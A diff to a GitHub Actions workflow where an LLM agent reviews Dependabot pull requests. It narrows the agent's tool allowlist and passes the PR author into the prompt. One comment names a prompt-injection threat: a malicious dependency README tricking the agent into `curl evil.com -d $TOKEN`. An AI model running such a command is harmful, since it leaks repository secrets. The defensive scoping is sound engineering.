@@ -14,7 +14,8 @@ name: Dependabot PR review
 #    The reviewer judges the BUMP (changelog vs our usage), never CI. It runs
 #    concurrently with CI and cannot know the outcome; the gate below is what
 #    reads CI, deterministically, at merge time. Do not ask the agent about CI
-#    and do not allow-list CI-reading tools for it: its `gh` runs on the
+#    and do not allow-list CI-reading tools for it (a tool counts as
+#    CI-reading if any flag of it reaches those APIs): its `gh` runs on the
 #    Claude App's own token (see the review step), which cannot read the
 #    Checks/Actions APIs, so such a tool 403s on every call and the model
 #    reports blindness as risk.
@@ -114,10 +115,25 @@ jobs:
           # to anything, defeating the allowlist). So `gh pr diff $PR_NUMBER` is DENIED;
           # the agent must see `gh pr diff 123` for `Bash(gh pr diff:*)` to match.
           PR_NUMBER: ${{ inputs.pr_number || github.event.pull_request.number }}
+          # The author is baked for a different reason: the reviewer holds no
+          # PR-metadata tool (`gh pr view` is a prefix wildcard whose --json
+          # flags reach the Checks API the agent's App token cannot read — see
+          # the allow-list comment below), so the not-from-Dependabot hard rule
+          # is fed its fact here instead. THIS step's gh runs on the workflow's
+          # own token, which can read it; same idiom as the autofix resolve
+          # step. Spellings documented at gate.cjs DEPENDABOT_AUTHORS.
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          REPO: ${{ github.repository }}
         run: |
+          PR_AUTHOR=$(gh pr view "$PR_NUMBER" --repo "$REPO" --json author --jq '.author.login')
           {
             echo 'prompt<<PROMPT_EOF_8X2Y'
-            sed "s/\$PR_NUMBER/$PR_NUMBER/g" .github/dependabot-review-prompt.md
+            # `|` delimiter on the author expression: gh renders app accounts
+            # as `app/<slug>` — a `/` would end a /-delimited s command on
+            # EVERY routine run. Logins are [A-Za-z0-9-] (EMUs add `_`) plus
+            # the app/ prefix and [bot] suffix; none of `|`, `&`, `\` can
+            # occur, so the replacement text is inert.
+            sed -e "s/\$PR_NUMBER/$PR_NUMBER/g" -e "s|\$PR_AUTHOR|$PR_AUTHOR|g" .github/dependabot-review-prompt.md
             echo 'PROMPT_EOF_8X2Y'
           } >> "$GITHUB_OUTPUT"
           # Captured BEFORE the agent runs, minus a 60s clock-skew margin: the
@@ -150,21 +166,28 @@ jobs:
           # surfaces if uncertain via `escalate`.
           #
           # --allowedTools: the action denies every tool by default. The
-          # prompt instructs the LLM to use `gh pr diff/comment/edit/view`,
+          # prompt instructs the LLM to use `gh pr diff/comment/edit`,
           # `gh release view`, `grep`, plus WebFetch for external
           # changelogs. Without explicit allowlisting every one of those
           # tool calls is denied (33 denials observed on the first 60-turn
           # run in practice). Scoped to specific Bash subcommands rather
           # than full `Bash` to limit injection blast radius — a malicious
           # dep README cannot trick the LLM into `curl evil.com -d $TOKEN`.
-          # Nothing in this list may need a scope the Claude App token lacks
-          # (the Checks and Actions APIs): the agent's `gh` runs on that
-          # token, so such an entry 403s on every call and invites the model
-          # to report blindness instead of reviewing. permissions.test.mjs
-          # enforces this.
+          # Nothing in this list may be able to REACH a scope the Claude
+          # App token lacks (the Checks and Actions APIs): the agent's `gh`
+          # runs on that token, so such an entry 403s on every call and
+          # invites the model to report blindness instead of reviewing.
+          # Each entry is a prefix wildcard, judged by the worst flag it
+          # admits — `gh pr view` needs only pull-requests:read at verb
+          # level, but `--json statusCheckRollup` rides the same wildcard
+          # into the Checks API; that dead entry sent the agent CI-hunting
+          # (12 denials in one run, issue #24). The one fact the prompt
+          # needed from it (the PR author) is resolved in the Load-prompt
+          # step and injected as text instead. permissions.test.mjs
+          # enforces this at flag granularity.
           claude_args: >-
             --max-turns 60 --model claude-opus-4-8
-            --allowedTools "Bash(gh pr comment:*),Bash(gh pr diff:*),Bash(gh pr edit:*),Bash(gh pr view:*),Bash(gh release view:*),Bash(grep:*),Read,Grep,Glob,WebFetch,Write"
+            --allowedTools "Bash(gh pr comment:*),Bash(gh pr diff:*),Bash(gh pr edit:*),Bash(gh release view:*),Bash(grep:*),Read,Grep,Glob,WebFetch,Write"
 
       - name: Diagnose the review agent (tool calls + denials + error)
         # claude-code-action writes the full turn-by-turn log to execution_file but
